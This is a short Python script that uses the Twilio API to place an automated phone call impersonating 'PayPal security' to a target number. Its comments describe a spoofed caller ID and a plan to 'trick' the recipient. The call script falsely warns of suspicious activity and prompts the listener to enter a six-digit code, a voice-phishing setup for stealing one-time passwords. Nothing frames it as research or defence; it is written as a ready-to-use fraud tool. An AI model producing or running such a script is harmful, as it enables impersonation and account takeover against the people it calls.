from twilio.rest import Client
import random

# Twilio creds from your dashboard
account_sid = 'US97f47f8350daa8c96bb9b9d3447d2893'
auth_token = 'YOUR_TOKEN_HERE'
client = Client(account_sid, auth_token)

# Spoofed caller ID (Twilio trial limits this, but we’ll roll with it)
from_number = '+16464446449'
target_number = '+4915678999999'

# Fake OTP code we’ll trick ‘em into giving
fake_otp = str(random.randint(100000, 999999))

# Script for the call—keep it short, convincing
message = f"Hi, this is PayPal security. We’ve detected suspicious activity. Your verification code is {fake_otp}. Please enter it now or press 1 to speak to an agent."

call = client.calls.create(
    twiml=f'<Response><Say voice="alice">{message}</Say><Pause length="2"/><Gather numDigits="6" timeout="10"/></Response>',
    to=target_number,
    from_=from_number)
print(f"Call sent. SID: {call.sid}")
